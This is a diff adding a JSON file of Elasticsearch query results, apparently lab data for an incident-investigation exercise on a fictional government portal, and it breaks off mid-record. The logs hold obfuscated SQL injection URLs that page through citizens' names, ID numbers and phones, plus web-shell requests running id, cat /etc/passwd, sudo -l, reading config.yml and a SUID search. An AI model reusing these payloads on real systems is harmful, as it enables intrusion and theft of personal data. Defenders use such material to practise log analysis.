@@ -1,0 +1,2280 @@
+{
+  "01": {
+    "took": 2,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 11079,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": []
+    },
+    "aggregations": {
+      "sources": {
+        "doc_count_error_upper_bound": -1,
+        "sum_other_doc_count": 10539,
+        "buckets": [
+          {
+            "key": "208.162.131.213",
+            "doc_count": 512,
+            "blocked": {
+              "doc_count": 300
+            },
+            "max_bytes": {
+              "value": 4260872.0
+            },
+            "ok": {
+              "doc_count": 192
+            }
+          },
+          {
+            "key": "102.172.176.153",
+            "doc_count": 2,
+            "blocked": {
+              "doc_count": 1
+            },
+            "max_bytes": {
+              "value": 199.0
+            },
+            "ok": {
+              "doc_count": 0
+            }
+          },
+          {
+            "key": "107.30.33.3",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 1
+            },
+            "max_bytes": {
+              "value": 199.0
+            },
+            "ok": {
+              "doc_count": 0
+            }
+          },
+          {
+            "key": "115.54.115.235",
+            "doc_count": 2,
+            "blocked": {
+              "doc_count": 1
+            },
+            "max_bytes": {
+              "value": 199.0
+            },
+            "ok": {
+              "doc_count": 0
+            }
+          },
+          {
+            "key": "20.197.130.84",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 1
+            },
+            "max_bytes": {
+              "value": 199.0
+            },
+            "ok": {
+              "doc_count": 0
+            }
+          },
+          {
+            "key": "1.102.229.27",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 11441.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "1.111.151.171",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 22119.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "1.161.172.22",
+            "doc_count": 4,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 14073.0
+            },
+            "ok": {
+              "doc_count": 3
+            }
+          },
+          {
+            "key": "1.247.252.12",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 16285.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "1.48.162.185",
+            "doc_count": 3,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 13679.0
+            },
+            "ok": {
+              "doc_count": 2
+            }
+          },
+          {
+            "key": "1.68.130.141",
+            "doc_count": 3,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 14351.0
+            },
+            "ok": {
+              "doc_count": 3
+            }
+          },
+          {
+            "key": "1.69.177.84",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 9586.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "100.130.54.71",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 12947.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "100.152.167.146",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 23578.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "100.179.255.243",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 9884.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "100.202.95.249",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 5555.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "100.227.247.17",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 14482.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "101.126.77.31",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 11732.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "101.149.4.59",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 10339.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          },
+          {
+            "key": "101.239.196.74",
+            "doc_count": 1,
+            "blocked": {
+              "doc_count": 0
+            },
+            "max_bytes": {
+              "value": 11809.0
+            },
+            "ok": {
+              "doc_count": 1
+            }
+          }
+        ]
+      }
+    }
+  },
+  "02": {
+    "took": 1,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 492,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": [
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000062426",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 5880,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "208.162.131.213",
+              "bytes": 4260872,
+              "id": "200",
+              "url": "/search?q=x%2527/**/uNiOn/**/sElEcT/**/name,rrn,phone/**/FROM/**/citizens/**/LIMIT/**/0,10000",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "full_log": "208.162.131.213 - - [27/Sep/2026:10:47:55 +0900] \"GET /search?q=x%2527/**/uNiOn/**/sElEcT/**/name,rrn,phone/**/FROM/**/citizens/**/LIMIT/**/0,10000 HTTP/1.1\" 200 4260872 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-27T10:47:55.070+0900"
+          },
+          "sort": [
+            4260872
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000062433",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 3197,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "208.162.131.213",
+              "bytes": 4150916,
+              "id": "200",
+              "url": "/search?q=x%2527/**/uNiOn/**/sElEcT/**/name,rrn,phone/**/FROM/**/citizens/**/LIMIT/**/20000,10000",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "full_log": "208.162.131.213 - - [27/Sep/2026:10:50:18 +0900] \"GET /search?q=x%2527/**/uNiOn/**/sElEcT/**/name,rrn,phone/**/FROM/**/citizens/**/LIMIT/**/20000,10000 HTTP/1.1\" 200 4150916 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-27T10:50:18.085+0900"
+          },
+          "sort": [
+            4150916
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000062439",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 7453,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "208.162.131.213",
+              "bytes": 3595601,
+              "id": "200",
+              "url": "/search?q=x%2527/**/uNiOn/**/sElEcT/**/name,rrn,phone/**/FROM/**/citizens/**/LIMIT/**/70000,10000",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "full_log": "208.162.131.213 - - [27/Sep/2026:10:54:48 +0900] \"GET /search?q=x%2527/**/uNiOn/**/sElEcT/**/name,rrn,phone/**/FROM/**/citizens/**/LIMIT/**/70000,10000 HTTP/1.1\" 200 3595601 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-27T10:54:48.299+0900"
+          },
+          "sort": [
+            3595601
+          ]
+        }
+      ]
+    },
+    "aggregations": {
+      "responses": {
+        "doc_count_error_upper_bound": 0,
+        "sum_other_doc_count": 0,
+        "buckets": [
+          {
+            "key": "403",
+            "doc_count": 300,
+            "last": {
+              "value": 1790472148922.0,
+              "value_as_string": "2026-09-27T01:22:28.922Z"
+            },
+            "max_bytes": {
+              "value": 199.0
+            },
+            "first": {
+              "value": 1790470925076.0,
+              "value_as_string": "2026-09-27T01:02:05.076Z"
+            }
+          },
+          {
+            "key": "200",
+            "doc_count": 192,
+            "last": {
+              "value": 1790474316423.0,
+              "value_as_string": "2026-09-27T01:58:36.423Z"
+            },
+            "max_bytes": {
+              "value": 4260872.0
+            },
+            "first": {
+              "value": 1790472155611.0,
+              "value_as_string": "2026-09-27T01:22:35.611Z"
+            }
+          }
+        ]
+      }
+    }
+  },
+  "03": {
+    "took": 2,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 26,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": [
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064167",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 260,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "POST",
+              "srcip": "60.173.18.44",
+              "bytes": 820,
+              "id": "200",
+              "url": "/minwon/apply",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:30:00 +0900] \"POST /minwon/apply HTTP/1.1\" 200 820 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:30:00.000+0900"
+          },
+          "sort": [
+            1790602200000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064168",
+          "_score": null,
+          "_source": {
+            "syscheck": {
+              "mode": "realtime",
+              "path": "/var/www/govportal/files/m_8812.php",
+              "uname_after": "www-data",
+              "event": "added"
+            },
+            "decoder": {
+              "name": "syscheck_new_entry"
+            },
+            "full_log": "File '/var/www/govportal/files/m_8812.php' added",
+            "timestamp": "2026-09-28T22:30:00.500+0900"
+          },
+          "sort": [
+            1790602200500
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064169",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 1119,
+              "id": "200",
+              "url": "/files/m_8812.php?c=id",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:31:02 +0900] \"GET /files/m_8812.php?c=id HTTP/1.1\" 200 1119 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:31:02.550+0900"
+          },
+          "sort": [
+            1790602262550
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064170",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c id"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602262.600:20168): argc=2 a0=\"sh -c id\"",
+            "timestamp": "2026-09-28T22:31:02.600+0900"
+          },
+          "sort": [
+            1790602262600
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064172",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 1049,
+              "id": "200",
+              "url": "/files/m_8812.php?c=uname+-a",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:31:59 +0900] \"GET /files/m_8812.php?c=uname+-a HTTP/1.1\" 200 1049 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:31:59.628+0900"
+          },
+          "sort": [
+            1790602319628
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064173",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c uname -a"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602319.678:20225): argc=2 a0=\"sh -c uname -a\"",
+            "timestamp": "2026-09-28T22:31:59.678+0900"
+          },
+          "sort": [
+            1790602319678
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064177",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 1861,
+              "id": "200",
+              "url": "/files/m_8812.php?c=cat+%2Fetc%2Fpasswd",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:32:43 +0900] \"GET /files/m_8812.php?c=cat+%2Fetc%2Fpasswd HTTP/1.1\" 200 1861 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:32:43.009+0900"
+          },
+          "sort": [
+            1790602363009
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064178",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c cat /etc/passwd"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602363.059:20269): argc=2 a0=\"sh -c cat /etc/passwd\"",
+            "timestamp": "2026-09-28T22:32:43.059+0900"
+          },
+          "sort": [
+            1790602363059
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064180",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 2395,
+              "id": "200",
+              "url": "/files/m_8812.php?c=sudo+-l",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:34:20 +0900] \"GET /files/m_8812.php?c=sudo+-l HTTP/1.1\" 200 2395 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:34:20.172+0900"
+          },
+          "sort": [
+            1790602460172
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064181",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c sudo -l"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602460.223:20366): argc=2 a0=\"sh -c sudo -l\"",
+            "timestamp": "2026-09-28T22:34:20.222+0900"
+          },
+          "sort": [
+            1790602460222
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064182",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 2970,
+              "id": "200",
+              "url": "/files/m_8812.php?c=ls+%2Fvar%2Fwww%2Fgovportal",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:35:16 +0900] \"GET /files/m_8812.php?c=ls+%2Fvar%2Fwww%2Fgovportal HTTP/1.1\" 200 2970 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:35:16.594+0900"
+          },
+          "sort": [
+            1790602516594
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064183",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c ls /var/www/govportal"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602516.645:20422): argc=2 a0=\"sh -c ls /var/www/govportal\"",
+            "timestamp": "2026-09-28T22:35:16.644+0900"
+          },
+          "sort": [
+            1790602516644
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064188",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 2581,
+              "id": "200",
+              "url": "/files/m_8812.php?c=cat+%2Fvar%2Fwww%2Fgovportal%2Fconfig.yml",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:37:47 +0900] \"GET /files/m_8812.php?c=cat+%2Fvar%2Fwww%2Fgovportal%2Fconfig.yml HTTP/1.1\" 200 2581 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:37:47.516+0900"
+          },
+          "sort": [
+            1790602667516
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064189",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c cat /var/www/govportal/config.yml"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602667.567:20573): argc=2 a0=\"sh -c cat /var/www/govportal/config.yml\"",
+            "timestamp": "2026-09-28T22:37:47.566+0900"
+          },
+          "sort": [
+            1790602667566
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064190",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 2310,
+              "id": "200",
+              "url": "/files/m_8812.php?c=ps+aux",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:39:49 +0900] \"GET /files/m_8812.php?c=ps+aux HTTP/1.1\" 200 2310 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:39:49.470+0900"
+          },
+          "sort": [
+            1790602789470
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064191",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c ps aux"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602789.521:20695): argc=2 a0=\"sh -c ps aux\"",
+            "timestamp": "2026-09-28T22:39:49.520+0900"
+          },
+          "sort": [
+            1790602789520
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064196",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 2132,
+              "id": "200",
+              "url": "/files/m_8812.php?c=netstat+-tnlp",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:41:38 +0900] \"GET /files/m_8812.php?c=netstat+-tnlp HTTP/1.1\" 200 2132 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:41:38.875+0900"
+          },
+          "sort": [
+            1790602898875
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064197",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c netstat -tnlp"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602898.925:20804): argc=2 a0=\"sh -c netstat -tnlp\"",
+            "timestamp": "2026-09-28T22:41:38.925+0900"
+          },
+          "sort": [
+            1790602898925
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064198",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 1163,
+              "id": "200",
+              "url": "/files/m_8812.php?c=find+%2F+-perm+-4000+2>%2Fdev%2Fnull",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:43:07 +0900] \"GET /files/m_8812.php?c=find+%2F+-perm+-4000+2>%2Fdev%2Fnull HTTP/1.1\" 200 1163 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:43:07.243+0900"
+          },
+          "sort": [
+            1790602987243
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064199",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c find / -perm -4000 2>/dev/null"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790602987.294:20893): argc=2 a0=\"sh -c find / -perm -4000 2>/dev/null\"",
+            "timestamp": "2026-09-28T22:43:07.293+0900"
+          },
+          "sort": [
+            1790602987293
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064200",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 543,
+              "id": "200",
+              "url": "/files/m_8812.php?c=crontab+-l",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:44:15 +0900] \"GET /files/m_8812.php?c=crontab+-l HTTP/1.1\" 200 543 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:44:15.115+0900"
+          },
+          "sort": [
+            1790603055115
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064201",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c crontab -l"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790603055.166:20961): argc=2 a0=\"sh -c crontab -l\"",
+            "timestamp": "2026-09-28T22:44:15.165+0900"
+          },
+          "sort": [
+            1790603055165
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064203",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 564,
+              "id": "200",
+              "url": "/files/m_8812.php?c=whoami",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:47:02 +0900] \"GET /files/m_8812.php?c=whoami HTTP/1.1\" 200 564 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:47:02.130+0900"
+          },
+          "sort": [
+            1790603222130
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064204",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c whoami"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790603222.181:21128): argc=2 a0=\"sh -c whoami\"",
+            "timestamp": "2026-09-28T22:47:02.180+0900"
+          },
+          "sort": [
+            1790603222180
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064207",
+          "_score": null,
+          "_source": {
+            "data": {
+              "duration_ms": 120,
+              "vhost": "govportal.kt66.lab",
+              "protocol": "GET",
+              "srcip": "60.173.18.44",
+              "bytes": 2107,
+              "id": "200",
+              "url": "/files/m_8812.php?c=hostname",
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
+            },
